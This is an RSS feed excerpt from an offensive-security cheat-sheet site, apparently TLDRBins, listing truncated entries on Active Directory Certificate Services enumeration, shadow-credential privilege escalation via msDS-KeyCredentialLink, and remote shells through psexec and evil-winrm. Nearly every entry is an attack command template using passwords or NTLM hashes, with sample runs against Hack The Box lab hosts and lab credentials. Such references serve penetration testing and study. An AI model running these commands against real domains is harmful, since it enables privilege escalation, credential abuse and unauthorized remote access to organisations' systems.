channel.title: Pass-the-Cert on TLDRBins
channel.description: Recent content in Pass-the-Cert on TLDRBins

item.title: ADCS
item.description: Enum (From Linux) certipy-ad nxc # Password certipy-ad find -u '<USER>' -p '<PASSWORD>' -target <TARGET> -text -stdout -vulnerable # NTLM certipy-ad find -u '<USER>' -hashes '<HASH>' -target <TARGET> -text -stdout -vulnerable # Kerberos certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -text -stdout -vulnerable -dc-host <DC> -ns <DC_IP> # Password nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M adcs # NTLM nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .

item.title: AddKeyCredentialLink
item.description: Privesc #1: Shadow Credential (From Linux) pywhisker certipy-ad 0. Pre-Check [Optional] # Password python3 pywhisker.py -t '<TARGET_USER>' --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> --use-ldaps $ python3 pywhisker.py --action list -d outdated.htb -u 'btables' -p '5myBPLPDKT3Bfq' --dc-ip 10.10.11.175 -t 'sflowers' --use-ldaps [*] Searching for the target account [*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb [*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute # NTLM python3 pywhisker.

item.title: Winrm
item.description: Psexec Password Hash # Domain auth impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' # Local auth impacket-psexec '<USER>:<PASSWORD>@<TARGET>' # Domain auth impacket-psexec '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> # Local auth impacket-psexec '<USER>@<TARGET>' -hashes :<HASH> Evil-Winrm Password Hash Kerberos crt & key evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>' $ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p 'qwe123QWE!@#' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.
